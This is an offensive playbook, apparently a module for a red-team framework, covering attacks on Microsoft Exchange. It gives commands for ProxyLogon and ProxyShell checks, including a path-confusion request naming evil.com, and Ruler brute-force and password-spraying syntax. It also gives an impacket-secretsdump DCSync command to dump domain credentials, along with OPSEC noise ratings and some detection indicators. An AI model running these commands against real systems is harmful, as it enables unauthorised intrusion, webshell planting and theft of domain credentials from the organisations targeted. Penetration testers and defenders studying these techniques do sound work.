# Exchange/Mail Attacks

tags: exchange, owa, proxylogon, proxyshell, mail, webshell, rce, ruler, active-directory

## Objective
Exploit Microsoft Exchange vulnerabilities for pre-auth RCE, credential theft, and privilege escalation.

## Prerequisites
- Exchange server identified (typically ports 443, 80)
- For post-auth attacks: valid mailbox credentials

## Methodology

### ProxyLogon (CVE-2021-26855 + CVE-2021-27065)
Pre-auth RCE via SSRF → admin impersonation → webshell write.
```bash
# Check vulnerability
curl -k https://EXCHANGE/owa/ -H "Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/"

# Exploit chain: SSRF → authenticate as admin → write webshell via OAB
```
**Detection**: `Set-OabVirtualDirectory` in MSExchange Management.evtx, webshells in ECP/OWA paths (`/aspnet_client/`, `/owa/auth/`).

### ProxyShell (CVE-2021-34473 + CVE-2021-34523 + CVE-2021-31207)
Pre-auth RCE via path confusion → PowerShell backend → mailbox export → webshell.
```bash
# Autodiscover path confusion
curl -k https://EXCHANGE/autodiscover/autodiscover.json?@evil.com/mapi/nspi/
```
**Detection**: `New-MailboxExportRequest` in management logs, anomalous `/autodiscover.json` requests.

### OWA Brute Force
```bash
# Ruler — OWA/Exchange brute force
ruler --email user@target.com --password pass brute

# Spray via OWA timing
# Valid accounts: slower response, invalid: faster
```

### Global Address List Extraction (post-auth)
Via OWA/EWS or MAPI: enumerate all mailboxes and contacts for user lists and org structure.

### Exchange Privilege Escalation
Exchange servers often have **inherited DCSync permissions** due to Exchange Windows Permissions group membership.
```bash
# If Exchange server is compromised:
# SYSTEM context on Exchange → often has Replicating Directory Changes rights
impacket-secretsdump -just-dc domain/EXCHANGE$@DC
```

## Graph Reporting
- **Host nodes**: Exchange server (`type: host`)
- **Service nodes**: OWA/443, EWS, MAPI
- **HAS_SESSION edges**: if webshell or RCE achieved
- **ADMIN_TO edges**: Exchange → DC (via inherited permissions)
- **CAN_DCSYNC edges**: if Exchange machine account has replication rights
- **User nodes**: from Global Address List extraction

## OPSEC Notes

| Technique | Noise Rating |
|-----------|-------------|
| ProxyLogon | 0.7 |
| ProxyShell | 0.7 |
| OWA brute force | 0.8 |
| GAL extraction | 0.3 |
| Exchange → DCSync | 0.8 |

**Detection**: IIS logs for exploit paths, MSExchange Management event logs, webshell file creation, 4662 for DCSync from Exchange server.

## Sequencing
- **After**: Network Recon (Exchange identified), Web Reconnaissance
- **Feeds →**: AD Privilege Escalation (DCSync via Exchange), Credential Dumping, Lateral Movement
